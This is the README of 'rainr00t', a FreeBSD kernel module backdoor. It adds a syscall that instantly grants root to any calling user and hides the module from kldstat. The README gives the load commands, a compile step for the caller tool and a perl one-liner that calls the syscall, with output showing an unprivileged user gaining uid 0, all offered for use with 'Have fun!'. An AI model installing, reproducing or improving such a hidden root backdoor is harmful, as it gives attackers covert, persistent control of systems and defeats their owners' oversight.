rainr00t
========

instant root-priv backd00r via kernelland anyone? get root and hide the module.
well this module, once loaded gives the thread/user calling instantly root, without spawning an extra
shell or alike. 

new feature in version 0.2
--------------------------

automaticly hiding the loaded module, be aware that you cant easily unload it now ;)

usage
-----

kernel
******
root@crashb0x:~/gainroot # uname -a
FreeBSD crashb0x 10.1-RELEASE FreeBSD 10.1-RELEASE #0 r274401: Tue Nov 11 21:02:49 UTC 2014     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64

root@crashb0x:~/gainroot # kldload ./rainroot.ko
root@crashb0x:~/gainroot # kldstat
Id Refs Address            Size     Name
 1    3 0xffffffff80200000 1755658  kernel

No rainroot in kldstat, just the default kernel.

userland
********
userland tool, to call the newly loaded syscall (normally its syscall 210, depending if you got extra syscalls on your box already) In this examples it is syscall nr 211.

compile it:
l00ser@crashb0x:/tmp $ gcc48 caller.c -o caller

test for help:
# ./caller 
rainroot caller
use appropiate syscallnumber (default: 210)
example: ./caller 210

execute and get root:
l00ser@crashb0x:/tmp % ./caller 211
l00ser@crashb0x:/tmp % id
uid=0(root) gid=0(wheel) egid=1001(l00ser) groups=1001(l00ser)

besides the caller you could also go with every language or operation requesting the syscall. for instance this perl one-liner:

l00ser@crashb0x:~ % id
uid=1001(l00ser) gid=1001(l00ser) groups=1001(l00ser)
l00ser@crashb0x:~ % perl -e 'syscall(211);'
l00ser@crashb0x:~ % id
uid=0(root) gid=0(wheel) egid=1001(l00ser) groups=1001(l00ser)

Have fun!

author
------
dash

